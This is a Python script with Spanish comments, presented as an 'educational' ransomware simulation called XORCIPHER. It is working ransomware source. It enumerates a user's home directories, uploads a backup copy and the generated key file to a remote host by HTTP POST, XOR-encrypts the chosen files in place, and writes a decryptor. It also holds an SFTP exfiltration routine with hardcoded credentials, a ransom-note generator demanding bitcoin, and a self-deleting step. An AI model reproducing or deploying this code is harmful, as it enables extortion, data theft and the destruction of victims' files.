# modulo para operaciones y navegacion en sistemas operativos
import os
# modulo para generar selecciones de caractreres u operaciones de manera aleatoria
import random
#modulo de reconocimiento del sistema
import platform
# modulo para comprension y operaciones de tipo 'string'
import string
#modulo para realizar copias 'backup' de carpetas enteras con la funcion 'rmtree()'
import shutil
#modulo para la conexion en protocolo 'ssh' para el server
import paramiko
# modulo para utilizar el tiempo como objeto en el codigo
import time
# para los avisos de sintaxis 
import warnings
# introduccion y aviso
import requests

print("""
 __________          
|XORCIPHER |
|ENCRYPTION|
|PROGRAM   |
|AND       |
|LIBRARY   |
|__________|
      
# This code is for educational purposes only.
    | # <simulates a ransomware on an RCE environment>     
# The authors and maintainers of this code assume NO responsibility.
    | # cibercrimes
    | # data loss
# for any consequences arising from its use.

# With great power comes great responsibility

# Designed by XORDeV Team. #nomespaladin@xorcipher
                                                     
""")

time.sleep(1)



#time.sleep(5)
# este codigo por cuestioines textuales presenta avisos de sintaxis 'SyntaxWarning' por el formato de las rutas
# este  factor no impide a que el codigo funcione 
# los avisos suelen aparecer tanto en la ejecucion del 'xorcipher.py' como el 'xordecipher.py' que escribe
# porcion de codigo que retira estos avisos de sintaxis
warnings.filterwarnings("ignore")


# variables globales del proyecto > inmutables
user = os.getlogin()
current = os.getcwd()
backup_dir = os.path.join(current,"cipher_backup")


# genera el token con un valor 'k' personalizado
def generate_token(k_value):
    try:
        token = "".join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=k_value))
        return token
    except ResourceWarning :
        print("[+]>YOUR SYSTEM CAN'T PROCESS THE KEY GENERATION")

# agarra la informacion del sistema
def get_system_info():
    try:
        system_info = []
        os_type = platform.system()
        system_info.append(os_type)
        os_arch = platform.machine()
        system_info.append(os_arch)
        os_version = platform.release()
        system_info.append(os_version)
        print(f"[+]> Current System > OS:{system_info[0]} | Architecture:{system_info[1]} | Version:{system_info[2]} |")
        return system_info
    except SystemError as SE:
        print("[+] WARNING > SYSTEM ERROR")
       
   

#lista con la informacion basica del sistema
sysinfo = get_system_info()

# crea el relative path en funcion al sistema operativo 
def create_real_path(user):
    try: 
        if sysinfo[0] == "Linux":
            relative_path = os.path.join(f"/home/{user}")
            print(f"[+]> USING > {relative_path}")
            return relative_path
        elif sysinfo[0] == "Windows":
            relative_path = os.path.join("C:\\","Users",f"{user}")
            print(f"[+]> USING > {relative_path}")
            return relative_path
        elif sysinfo[0] == "Darwin":
            relative_path = os.path.join(f"/Users/{user}")
            print(f"[+]> USING > {relative_path}")
            return relative_path
        else:
            try:
                for root,_,_ in os.walk("/"):
                    # configuracion de path para IoT
                    # 'path' de sistemas FAT,LittleFS,SPIFFS
                    # si existe home directory tradicioanl
                    if f"/home/{user}" in root:
                        relative_path = f"/home/{user}"
                        sysinfo[0] = "Linux"
                        print(f"[+]> USING > {relative_path}")
                        return relative_path
                    # posibles IoT sin user home directory
                    elif f"/data/{user}" in root:
                        relative_path = f"/data/{user}"
                        sysinfo[0] = "Linux"
                        print(f"[+]> USING > {relative_path}")
                        return relative_path
                    # posibles istemas de ordenadores de vehiculos 
                    elif f"/usr/local/{user}" in root:
                        relative_path = "/usr/local"
                        sysinfo[0] = "Linux"
                        print(f"[+]> USING > {relative_path}")
                        return relative_path
                    # posibles dispositivos de robotica ROS
                    elif "/home/robot" in root:
                        relative_path = "/usr/local"
                        sysinfo[0] = "Linux"
                        print(f"[+]> USING > {relative_path}")
                        return relative_path
                    else:
                        raise PermissionError("[+]> WARNING > NO PRIVILEGES ")
            except PermissionError as PE:
                print("[+]> WARNING > NO PRIVILEGES")
                pass
    except OSError :
        print("[+]> WARNING > OPERATIONAL SYSTEM ERROR")


# string que contiene la ruta relativa en funcion al sistema
relative_path = create_real_path(user)

# agarra los directorios raiz que sean directorios y devuelve una lista con los nombres de los mismos
def get_dirs(relative_path):
    real_dirs_list = []
    try: 
        for dirs in os.listdir(relative_path):
            if os.path.isdir(os.path.join(relative_path,dirs)):
                if "." not in os.path.join(relative_path,dirs):
                    real_dirs_list.append(dirs)
        return real_dirs_list
    # cualquier cproblemna relacionado a un path 
    except PermissionError :
        print("[+]> WARNING > NO PRIVILEGES ")

# lista con nombre de directorios encontrados
real_dirs_list = get_dirs(relative_path)
#print(real_dirs_list)

# crea un diccionario con el nombre de los directorios y un indice para eleccion de usuario 
def directories_dictionary(real_dirs_list):
    dirs_dict = {}
    for index, found in enumerate(real_dirs_list):
        #print(f"{index}:{found}")
        dirs_dict[index] = found
    return dirs_dict

# diccionario con los directorios encontrados y su indice    28
directories_dictionary = directories_dictionary(real_dirs_list)
#print(directories_dictionary)

# agrra la decision del usuario y devuelve la decision como nombre de directorio para buscar los archivos
def get_user_choice(directories_dictionary):
    print("[+]> PROCESS > DIRECTORIES FOUND ON SYSTEM \n")
    print("[+]> MESSAGE > CHOOSE DIR NUMBER OR 'A' FOR ALL DIRECTORIES ")
    print("[+]> WARNING > BE CAERFUL CHOOSING 'A' IF YOU ARE RUNNING WITH PRIVILEGES!")
    for dindex, ddir in directories_dictionary.items():
        print(f"{dindex} > {ddir}")
    
    choice = input("[+]> CHOOSE DIRECTORY TO ENCRYPT OR 'A':")
    
    while True:
        try:
            if choice == 'A' or choice == 'a':
                if sysinfo[0] == "Linux":
                    print("[+] SELECTED > EVERYTHING")
                    return relative_path
                elif sysinfo[0] == 'Windows':
                    print("[+] SELECTED > EVERYTHING")
                    return relative_path
            elif choice.isdigit() and int(choice) in directories_dictionary:
                print(f"[+] SELECTED > {directories_dictionary[int(choice)]}")
                time.sleep(1)
                return directories_dictionary[int(choice)]
            else:
                choice = input("Not an valid option, chose directory number:")
        except ValueError as ve:
            print(ve)
        
# 'directorio' como nombre o '/home' si choice = A/a (linux) o 'C:/users/
user_choice = get_user_choice(directories_dictionary)
#print(user_choice)

# hace un barrido en el directorio seleccionado y crea una lista con los nombres completos de los archivos de cada carpeta del directorio elegido
def get_full_names(relative_path,user_choice,sysinfo):
    full_file_path_list = []
    try:
        if user == relative_path and sysinfo[0] == "Linux":
            try:
                print("[+]> SELECTED > ALL FILES  ")
                for root,_,files in os.walk(user_choice):
                    for file in files:
                        full_file_path_list.append(os.path.join(root,file))
                
            except Exception:
                print(Exception)
        elif user == relative_path and sysinfo[0] == "Windows":
            print("WINDOWS FOUND")
            try:
                print("[+]> SELECTED > ALL FILES  ")
                for root,_,files in os.walk(user_choice):
                    for file in files:
                        full_file_path_list.append(os.path.join(root,file))
                
            except Exception:
                print(Exception)
        else:
            try:
                if sysinfo[0] == "Linux":
                    for root,_,files in os.walk(os.path.join(relative_path,user_choice)):
                        for file in files:
                            full_file_path_list.append(os.path.join(root,file))
                        
                elif sysinfo[0] == "Windows":
                    for root,_,files in os.walk(os.path.join(relative_path,user_choice)):
                        for file in files:
                            full_file_path_list.append(os.path.join(root,file))
                        
            except Exception:
                print(Exception)
    except Exception:
        print(Exception)
    return full_file_path_list
        
# lista con barrido completo de archivos segun eleccion de directorio
file_path_list = get_full_names(relative_path,user_choice,sysinfo)
#print(file_path_list)
#print(type(file_path_list))

# funcion para crear copia de la carpeta raiz con todo su contenido
def backup_files(source_path,destination_path):
    
    try:
        if not os.path.exists(source_path):
            print("[+]> WARNING > Source path does not exist.")
            return
        
        if os.path.exists(destination_path):
            print("[+]> WARNING > Destination path allready exist")
            return
        
        #copy the full directory to a new destination
        shutil.copytree(source_path,destination_path)
        print(f"[+]> WARNING > Backup Correct")
    except Exception as e:
        print(f"An ERROR occured due: {e}")


# llama la funcion de backup en funcion al user_choice
def make_backup(relative_path,user_choice,backup_dir,current):
    try:
        if user_choice == relative_path:
            backup_files(relative_path,backup_dir)
        elif user_choice != relative_path:
            path = os.path.join(relative_path,user_choice)
            backup_files(path,backup_dir)
    except PermissionError :
        print("[+]> WARNING > Backup Incorrect ")
        pass
# crea una copia en el mismo directorio que el codigo
make_backup(relative_path,user_choice,backup_dir,current)

# funcion para enviar los archivos a un server side folder
def send_backup():
    try:
        for root,_,files in os.walk(backup_dir):
            for file in files:
                if not 'zip' in file:
                    full_path = os.path.join(root,file)
                    print(full_path)
                
                url = 'your.server.host'
                
              
                with open(full_path, 'rb') as file:
                    files = {'file_data': file}  
                    response = requests.post(url, files=files)

                print(response.text)
    except ConnectionError:
        print(ConnectionError)
# send the files
send_backup()



# funcion para crear el diccionario clave de descifrado
def create_keyfile_dict(file_path_list):
    keyfile_dict = {}
    for file in file_path_list:
        keyfile_dict[file] = generate_token(101)
    return keyfile_dict
    
    
# convierte el diccionario a una variable
tokenized_dict = create_keyfile_dict(file_path_list)

# crea el archvio llave de descifrado 
def create_keyfile(tokenized_dict,user):
    try:
        with open(f"{user}_decryption_key.py",'w', encoding='UTF-8') as file:
            file.write(f"{user}decipher_key = "+"{")
            for filename,key in tokenized_dict.items():                                
                file.write(f"r'{filename}':'{key}',")
            file.write("}")
        file.close()
        size = os.path.getsize(os.path.join(current,f"{user}_decryption_key.py"))
        return size
    except FileExistsError :
        print("[+]> WARNING > SYSTEM ALLREADY ENCRYPTED")
    except UnicodeEncodeError:
        pass
# crea el archivo 'key' y devuelve el tamano del archivo key como integer
key_size = create_keyfile(tokenized_dict,user)


# unica extension archivo key
files_extension =  f'{user}_decryption_key.py'

# enviar la key a un folder serverside separado 
def send_data(user, current, files_extensions):

    
    try:
        all_success = True  
    
        filep = os.path.join(current, files_extension)
        file_name = f'owned_{files_extension}'
        file_path = filep 

        with open(file_path, 'rb') as file:
            file_data = file.read()
            payload = {
                'file_data': file_data,
                'file_name': file_name
            }
            
            
           
            if 'py' in files_extension:
                url = 'your.server.host'
            
            response = requests.post(url, data=payload)
            
            # Check response status
            if response.status_code == 200:
                print(f'Successfully sent {file_name}.')
            else:
                print(f'Failed to send {file_name}. Status code: {response.status_code}')
                all_success = False  

        if all_success:
            print('All files sent successfully.')
        else:
            print('Some files failed to send.')
            
    except ConnectionError:
        print("Connection error occurred.")
    except ConnectionRefusedError:
        print("Connection was refused.")
# envia la key al server 
send_data(user, current, files_extension)


# funcion para crear el programa de descifrado singular 
def custom_decipher_file(current,key_size,user):
    with open("XORDECIPHER.py",'w') as file:
        if sysinfo[0] == "Windows":
            
            file.write(f"""

import {user}_decryption_key
import time
import os 
import warnings
print("****** WELCOME TO XORCIPHER DECRYPTION PROGRAM ******")
time.sleep(1)
print("[+]> AUTO DECRYPTION > [ON]")
time.sleep(1)
# el codigo presenta avisos de sintax por el formato de las rutas 
# esto no afecta el codigo ni su funcionamiento
# porcion de codigo para no imprimir los avisos caso hayan
warnings.filterwarnings("ignore")


# variable global = diccionario de claves
solution = {user}_decryption_key.{user}decipher_key

# funcion de desencriptar
def decryptor(solution):
    try:                                                                        
        for filename, key in solution.items():
            with open(filename,'rb') as file:
                encrypted_data = file.read()
            key_bytes = bytearray(key,'utf-8')
            decrypted_data = bytearray()
            for i,byte in enumerate(encrypted_data):
                decrypted_data.append(byte ^ key_bytes [i % len(key_bytes)])
            with open(filename,'wb') as sfile:
                sfile.write(decrypted_data)
                print("[+]> DECRYPTING DATA CORECTLY")
    except FileNotFoundError:
        print("[+]> WARNING > ERRROR Decrypting > Files does not exist")
    except PermissionError:
        pass


# funcion para corroborar el archivo 'key', si lo es procede a desencriptarlo
# caso contrario, no lo desencripta.

def check_keyfile():
    try:
       
        keyfile = r"{current}\\{user}_decryption_key.py"
        size = os.path.getsize(keyfile)
        if size == {key_size}:
            print("[+]> UNIQUE FILEkey FOUND ")
            print("[+]> PROCEED DECRYPTION")
            decryptor(solution)
            print("[+]> FILES RECOVERED ")
            print("[+] WARNING > DELETING DECIPHER PROGRAM AND REMAINING KEY ")
            os.remove(r"{current}/XORDECIPHER.py")
            key_filepath = r"{current}\\{user}_decryption_key.py"
            #os.remove(key_filepath)
            time.sleep(1)
            print("[+]> EXITING")
            time.sleep(1)
        else:
            print("[+]> WARNING > Is not the UNIQUE file, cannot decrypt, ending program...")
    except FileNotFoundError as FNFE:
        print(FNFE)
        
check_keyfile()

""")
            file.close()
        elif sysinfo[0] == "Linux":
            file.write(f"""
        
import {user}_decryption_key
import time
import os 
import warnings 
print("****** WELCOME TO XORCIPHER DECRYPTION PROGRAM ******")
time.sleep(1)
print("[+]> AUTO DECRYPTION > [ON]")
time.sleep(1)

# el codigo presenta avisos de sintax por el formato de las rutas 
# esto no afecta el codigo ni su funcionamiento
# porcion de codigo para no imprimir los avisos caso hayan
warnings.filterwarnings("ignore")

# variable global = diccionario de claves
solution = {user}_decryption_key.{user}decipher_key

# funcion de desencriptar
def decryptor(solution):
    try:                                                                        
        for filename, key in solution.items():
            with open(filename,'rb') as file:
                encrypted_data = file.read()
            key_bytes = bytearray(key,'utf-8')
            decrypted_data = bytearray()
            for i,byte in enumerate(encrypted_data):
                decrypted_data.append(byte ^ key_bytes [i % len(key_bytes)])
            with open(filename,'wb') as sfile:
                sfile.write(decrypted_data)
                print("[+]> DECRYPTING DATA CORECTLY")
    except FileNotFoundError:
        print("[+]> WARNING > ERRROR Decrypting > Files does not exist")
   


# funcion para corroborar el archivo 'key', si lo es procede a desencriptarlo
# caso contrario, no lo desencripta.

def check_keyfile():
    first_part = f"{current}"
    second_part = f"{user}_decryption_key.py"
    unicode_valid = os.path.join(first_part,second_part)
    keyfile = unicode_valid


    size = os.path.getsize(keyfile)
    if size == {key_size}:
        print("[+]> UNIQUE FILEkey FOUND ")
        print("[+]> PROCEED DECRYPTION")
        decryptor(solution)
        print("[+]> FILES RECOVERED ")
        time.sleep(1)
        print("[+] WARNING > DELETING DECIPHER PROGRAM ")
        #os.remove("{current}/XORDECIPHER.py")
        key_filepath = "{current}/{user}_decryption_key.py"
        os.remove(key_filepath)
        print("[+]> EXITING")
        time.sleep(1)
    else:
        print("[+]> WARNING > Is not the UNIQUE file, cannot decrypt, ending program...")
        
check_keyfile()

""")
            file.close()
    
    

# crea el programa de descifrado'xordecipher.py'
custom_decipher_file(current,key_size,user)

# funcion para enviar al servidor el 'backup.zip' y 'decryption_key'  de manera automatizada 
# esta funcion es parte de la libreria ya que las credenciales tienen que estar 'hardcoded' pueden llegar a ser expuestas 
# desactivada por default , descomentar la funcion para activarla
def send_sftp(current,user):
    try:

        zipfile_path = os.path.join(current,f"{user}_cipher_backup.zip")
        key_filepath = os.path.join(current,f"{user}_decryption_key.py")
     

        sftp_server = 'ip.server.sftp'
        sftp_username = 'cipher'
        sftp_password = 'entiadmin'
        time.sleep(.5)
        print("[+]> MESSAGE > Creating SFTP Connection ...")
        transport = paramiko.Transport((sftp_server, 22))
        # conecta al servidor con las credenciales especificas
        transport.connect(username=sftp_username, password=sftp_password)
        time.sleep(.5)
        print("[+]> MESSAGE > Connected")
        time.sleep(.5)
        print("[+]> MESSAGE > Creating session..")
        sftp_connection = paramiko.SFTPClient.from_transport(transport)
        time.sleep(.5)
        print("[+]> MESSAGE > Session successfully created")
        time.sleep(.5)
        print("[+]> MESSAGE > Creating folder...")
        #intenta crear un directorio en el servidor con el nombre del usuario victima
        # utiliza un identificador  en el caso de que quiera encriptar mas de un directorio en el mismo sistema
        singularity = generate_token(5)
        shared_folder = f"{user}_{singularity}"
        try:
            sftp_connection.mkdir(shared_folder)
        except FileExistsError :
            print("[+]> WARNING > FOLDER ALLREADY EXIST")
            pass  
        time.sleep(1)
        print("[+]> MESSAGE > Folder Created successfully")
        # cambia al directorio creado
        sftp_connection.chdir(shared_folder)
        time.sleep(1)
        print("[+]> MESSAGE >Preparing to send files ...")
        sftp_connection.put(zipfile_path, os.path.basename(zipfile_path))
        time.sleep(1)
        sftp_connection.put(key_filepath, os.path.basename(key_filepath))
        print("[+]> MESSAGE > Files Transfered successfully!!!")

        # cierra la conexion con el servidor despues de transferir los archivos
        time.sleep(3)
        print("[+]> MESSAGE > Closing connection in 3 seconds..")
        sftp_connection.close()
        transport.close()
        time.sleep(1)
        print("[+]> MESSAGE > Connection closed | Session Closed")
    except ConnectionRefusedError:
        print("[+]> WARNING > CONNECTION REFUSED")
        pass
    except ConnectionAbortedError:
        print("[+]> WARNING > CONNECTION ABORTED")
        pass
    except ConnectionError:
        print("[+]> WARNING > CONNECTION ERROR ")
        pass

# envia los arsiguiente linea para enviar archivos al sftp
#send_sftp(current,user)

# funcion para encriptar los archivos del dichivos al servidor
# descomentar la ccionario 'tokenized_dict'
def xor_encrypt(tokenized_dict):
    for filename,key in tokenized_dict.items():
        try:
            with open(filename,"rb") as file:
                data_content = file.read()
            
            key_bytes = bytearray(key, 'utf-8')
            encrypted_data = bytearray()
            for i,byte in enumerate(data_content):
                encrypted_data.append(byte ^ key_bytes[i % len(key_bytes)])
            
            with open(filename, 'wb') as encrypted:
                encrypted.write(encrypted_data)
                print(f"[+]> {filename} >> Encrypted ")
        except FileNotFoundError:
            print("[+]> WARNING > ERROR FILE NOT FOUND")
        except PermissionError:
            pass
# encripta los archivos de la carpeta seleccionada al principio
xor_encrypt(tokenized_dict)

# funcion para borrar los archivos de backup y clave de descifrado
# desactivado por defecto para no borrar la clave en tests
# recomendado solo descomentar la recoccion de la llave cuando haya una forma de recuiperacion segura de la misma
def erase_local_files(current,user):
    try:
        
        decryptionfile_extension = f"{user}_decryption_key.py"
        decryptionfile_path = os.path.join(current,decryptionfile_extension)
        #os.remove(decryptionfile_path) #<< elimina la key de cifrado
    except PermissionError:
        print("[+]> WARNING > NO PRIVILEGES")
    except WindowsError:
        print("[+]> WARNING > WINDOWS ERROR")
# elimina el archivo key de  descifrado
erase_local_files(current,user)


# funcion para dejar petar el desktop con archivos de instruccion
# Desactivado por defecto , necesita un path

def let_instructions(current,relative_path):
    for i in range(1,999):
        with open(os.path.join(relative_path,"Desktop",f"RECOVER_YOUR_FILES{i}.txt"),'w') as file:
            file.write(f"""
    HELLO MY FRIEND, I HOPE YOU FIND YOURSELF WELL BECAUSE I HAVE SOME BAD NEWS FOR YOU..

    YEAH . . .  YOUR FILES ARE ENCRYPTED !!

    TO RECOVER YOUR FILES, SEND 1000 $ IN BTC TO THE ADDRESS > 'simulated_bitcoin_address'

    AFTER THAT SEND A MAIL TO > hacker@hacker.hacker WITH THE TRANSACTION HASH 

    AFTER VALIDATION, THE KEY TO DECRYPT YOUR FILES WILL BE SENT TO THE MAIL YOU SENT THE HASH.

    HAVE A NICE DAY! =)  VISIT >>> hhtps://YOUR.WEBSITE.HOST

    YOU WILL FIND THE DECRYPTOR AT>>>> {current} 

    REMEMBER : YOU CAN'T DECRYPT YOUR FILES WITHOUT THE SPECIFIC KEY FILE IN THE SAME DIRECTORY AS XORDECIPHER.PY,

    ONCE THE KEYFILE IS ON THE SAME DIRECTORY, DECRYPTION PROGRAM WILL WORK ALONE AND CORRECTLY.

                           
    """)
    file.close()
# deja el mensaje 
#let_instructions(current,relative_path)

# funcion para autodestruirse y reiniciar dispositivo
def blackout(current,sysinfo):
    try:
        if sysinfo[0] == "Linux":
            os.remove(f"{current}/xorcipher.py")
            #os.system("reboot")
        elif sysinfo[0] == "Windows":
            filename = "xorcipher.py"
            os.remove(os.path.join(current,filename))
            #os.system("shutdown /r /t 0")
    except PermissionError:
        print("[+]> WARNING > NO PRIVILEGES ")
        pass
    except FileNotFoundError:
        pass
# autodestruccion y reinicio de sistema
blackout(current,sysinfo)
# fin del codigo









